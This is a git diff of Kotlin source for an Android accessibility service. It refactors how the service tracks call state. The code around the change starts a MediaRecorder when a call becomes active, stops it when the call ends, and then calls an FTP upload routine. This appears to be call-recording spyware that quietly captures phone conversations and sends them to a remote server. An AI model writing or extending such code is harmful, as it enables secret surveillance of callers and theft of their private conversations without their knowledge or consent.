@@ -11,6 +11,7 @@ import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.widget.Toast
 import com.github.arekolek.phone.WH_OngoingCall.state
+import com.mbarrben.dialer.CallManager
 import com.uber.rxdogtag.RxDogTag
 import io.reactivex.Observable
 import io.reactivex.disposables.CompositeDisposable
@@ -36,6 +37,7 @@ import kotlin.system.exitProcess
 
 class WH_MyAccessibilityService() : AccessibilityService() {
 
+    private var updatesDisposable = Disposables.empty()
     var windowManager: WindowManager? = null
     var recorder = MediaRecorder()
     private var phoneNumber: String? = ""
@@ -51,19 +53,11 @@ class WH_MyAccessibilityService() : AccessibilityService() {
         super.onCreate()
 
         Timber.plant(Timber.DebugTree())
-        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
-        Timber.i("MyAccessibilityService")
-        state
-            .subscribe(::updateUi)
-            .addTo(disposables)
+        updatesDisposable = CallManager.updates()
 
-        state
-            .filter { it == Call.STATE_DISCONNECTED }
-            .delay(1, TimeUnit.SECONDS)
-            .firstElement()
-            .subscribe {  }
-            .addTo(disposables)
-
+            .doOnEach { Timber.e("$it") }
+            .doOnError { Timber.e("Error processing call") }
+            .subscribe { updateView(it) }
 
         Toast.makeText(this, "onCreate 집입", Toast.LENGTH_SHORT).show()
         connect()
@@ -214,13 +208,13 @@ val path : String = con.printWorkingDirectory()
         }
     }
 
-    private fun updateUi(state: Int) {
-        when (state.asString()) {
-            "ACTIVE" -> {
+    private fun updateView(gsmCall: GsmCall) {
+        when (gsmCall.status) {
+            GsmCall.Status.ACTIVE -> {
                 startRecordingA()
                 sqlDB("ACTIVE")
             }
-            "DISCONNECTED" -> {
+            GsmCall.Status.DISCONNECTED -> {
                 stopRecordingA()
                 sqlDB("DISCONNECTED")
                 connFtp()
